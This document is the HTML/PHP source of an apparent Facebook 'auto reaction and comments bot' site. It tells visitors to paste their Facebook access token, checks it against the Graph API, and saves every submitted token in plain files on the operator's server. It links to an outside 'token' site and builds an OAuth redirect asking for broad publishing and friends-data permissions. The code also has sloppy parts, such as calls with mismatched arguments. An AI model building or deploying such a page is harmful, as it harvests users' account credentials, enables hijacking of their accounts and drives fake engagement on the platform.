<html>

<html>

	<head>
		<meta charset="utf-8"/>
		<title>MrDj AyeSh</title>







<style>



html {
    text-align:center;
    background: url(hh.jpg) no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
 
}
#header{
    font-family:AwiFont;
}
  
@font-face {

    font-family: AwiFont;

    src: url(awi.ttf);

}
#footer{
    font-family:AwiFont;
}
#header{
    font-family:AwiFont;
}



#footer a,
.heading a,
#navigation-menu h3 a,
#comments h3 a,
#navigation a,
#following-list h4 a,
#blogroll_list h3 a {
    color:#eee;
    text-shadow:#222 1px 1px 1px;
}

.post-single 
.post-meta 
.title,
#following-list li a,
#category-bottom li a,
#recent-posts-list li a {
    color:#444;
    text-shadow:#fff 1px 1px 1px;
}

.post:first-child 
.post-content a {
    color:#444;
    text-shadow:none
}

#footer span {
    background:transparent !important;
    border:none !important;
    color:#eee !important
}

.date {
    display:none;
}

.post-single 
.post-content textarea {
    width:70px;
    height:70px;
    padding:0;
    margin:0;
}

.post-content,
.comment-content {
    word-wrap:break-word;
}






#center {
    text-align:center;
    margin:0;
    padding:6px 0;
    border-width:1px 0
    }


    
    .search {
  font-family: 'Rancho', cursive;
    font-size: 20px;
    background:white;
    color:black;
    height:36px;
    line-height:36px
    margin:5px 10px 5px 0;
    padding:0 12px;
    border-radius:15px;
    border: 3px solid black;
    outline:none;
    transition:all 0.25s;
    -moz-transition:all 0.25s;
    -webkit-transition:all 0.25s;
}

.search:focus {
   background:blue;
    cursor:pointer;
    cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),progress !important;
}

.button {
    font-family: 'Rancho', cursive;
    font-size: 20px;
    background:white;
    color:black;
    height:36px;
    line-height:36px
    margin:5px 10px 5px 0;
    padding:0 12px;
    border-radius:15px;
    border: 3px solid black;
    outline:none;
    transition:all 0.25s;
    -moz-transition:all 0.25s;
    -webkit-transition:all 0.25s;
}

.button:hover{
    background:blue;
    cursor:pointer;
    cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),progress !important;
}








</style>















<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
❤AYESH REACTION + COMMENTS BOT❤
</title>
<link rel="stylesheet" type="text/css" href="AYESH.css" media="all,handheld"/>




 
</style>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$CHUMI[]=$b.'='.$c;
}
	$true='?'.implode('&',$CHUMI);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY Ayesh user',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('CHUMI')){

        mkdir('CHUMI');
}

if($bb){

	$blue=fopen('CHUMI/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('CHUMI/'.$id)){

	$file=file_get_contents('CHUMI/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('CHUMI/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('CHUMI/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('CHUMI/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('CHUMI/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('CHUMI/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('CHUMI/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="container">
<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
</form>
</div>
</div></div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'

</center></span>
';
}

public function home(){
echo'
<div id="header">
<div class="foo">
<center>
<b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;color: yellow ;font-size:80px;">WELLCME TOU MY SITE JANI </font></b>
</div>
<br>
</a></div>
</font>
</div></div>
<a href="https://www.facebook.com/OLdISDISABLE" alt="Owner" target="_blank"> <img src="baig.jpg" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>
<br>
</div>

<span>
</div>

 <centre><div id="content"></div> <div class="post"></div> <div class="post-content"><img src="" class="jarvis"><br> <img src="" class="jarvis-inner"></br></div> <div class="post-meta2"> </centre></div> 
<center>
<br>
<br>
<center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:yellow; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"width="250" height="250"><a href="http://scure-token.tk" target="blank"><input class="button button5" type="button" value="GET TOKEN"></a></font></center></a></li>

';
}

public function bwh(){
echo'

<center>
<h4><font size="26" color="red"><center>•.¸¸.•`</font><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>  SUBMIT YOUR TOKEN HERE !  </b></font><font size="26" color="red"> `•.¸¸.•</center> </font></h4>
<center>


<center>
<center> 


<center>
<center><form action="index.php" method="post">
<input class="search" type="text" style="height:80px;width:600px;" name="token" placeholder="Paste Your Access Token Here" required> <input class="button" type="submit"style="height:82px;width:200px;" value="SUBMIT"></form></center> 











';







$this->membEr();
}

public function membEr(){

	if(!is_dir('CHUMI')){

	mkdir('CHUMI');
}

$up=opendir('CHUMI');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'


</font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60">ACTIVE USERX: <font color="red">'.count($user).'</font></strong></center>
</font>

</div>
<center>
</font>
</font><br>
</font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60"> SCRIPT EDITOR :    </strong><font style="color:red;font-size:33px;"><font color="red"><font size="60"> MRDJ AYASH  </font></strong></center>


<br>
<br>
<br><br></font><marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="6" direction="left" truespeed="truespeed">
<img src="SP.gif"></font></font></strong><font color="yellow"><font size="60">NOTE:-</b><font color="green"><font size="60"> POWERED BY TALHA BAIG*
<img src="MS.gif"></marquee>




';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('CHUMI/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('CHUMI/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>



